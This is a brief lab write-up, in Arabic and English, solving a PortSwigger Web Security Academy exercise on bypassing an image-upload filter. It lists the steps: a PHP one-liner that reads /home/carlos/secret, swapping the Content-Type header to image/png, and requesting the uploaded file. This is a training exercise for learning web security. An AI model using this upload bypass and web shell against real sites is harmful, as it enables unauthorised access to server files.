# Lab : Web shell upload via Content-Type restriction bypass

https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass

- الفكره من الLab ده ان في function بترفع علي صور بس ممكن تقبل اي ملف تاني لو عدلت في الcontent - type  الخاص بالملف الي ببعته

```bash
1. nano test.php

2. <?php echo file_get_contents('/home/carlos/secret'); ?>

3. Content-Type: application/x-php ==> Content-Type: image/png

4. GET /files/avatars/test1.php HTTP/2
```
